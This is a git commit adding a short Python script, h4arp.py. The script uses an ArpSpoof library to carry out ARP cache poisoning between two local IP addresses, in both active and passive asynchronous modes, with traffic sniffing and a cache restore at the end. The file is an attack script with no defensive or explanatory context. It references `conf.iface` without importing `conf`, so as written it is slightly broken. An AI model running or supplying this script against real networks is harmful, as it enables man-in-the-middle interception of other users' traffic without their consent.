d1c45c6fa158cead71706c0653e3c144b86cd07c
Sevval25 <turansevvall2003@gmail.com>
2025-03-15 13:56:33 +0300

    Add files via upload

---
+++ h4arp.py
@@ -0,0 +1,10 @@
+from ArpSpoof import SpooferARP
+
+spoofer = SpooferARP('10.100.0.1', '10.100.0.2')
+spoofer.active_cache_poisonning()
+
+spoofer = SpooferARP('10.100.0.1', '10.100.0.2', conf.iface, False, 0.5)
+spoofer.passive_cache_poisonning(asynchronous=True)
+spoofer.run = False
+spoofer.sniffer.stop()                                   # only with asynchronous mode
+spoofer.restore()                                        # only with asynchronous mode
